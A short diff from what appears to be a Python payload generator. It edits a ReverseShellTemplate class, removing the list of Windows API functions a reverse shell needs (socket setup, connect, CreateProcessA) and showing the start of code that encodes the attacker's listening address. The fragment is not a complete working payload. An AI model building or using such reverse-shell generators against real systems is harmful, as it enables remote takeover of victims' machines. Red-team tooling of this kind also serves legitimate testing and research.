@@ -14,14 +14,6 @@ from ..encode import encode_dword, encode_word, safe_push_word_as_dword
 
 
 class ReverseShellTemplate(PayloadTemplate):
-    REQUIRED_FUNCTIONS = (
-        "LoadLibraryA",
-        "WSAStartup",
-        "WSASocketA",
-        "connect",
-        "CreateProcessA",
-    )
-    REQUIRED_VARIABLES = ("socket_handle",)
 
     def emit(self, layout, config: TemplateConfig) -> str:
         ip_le = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
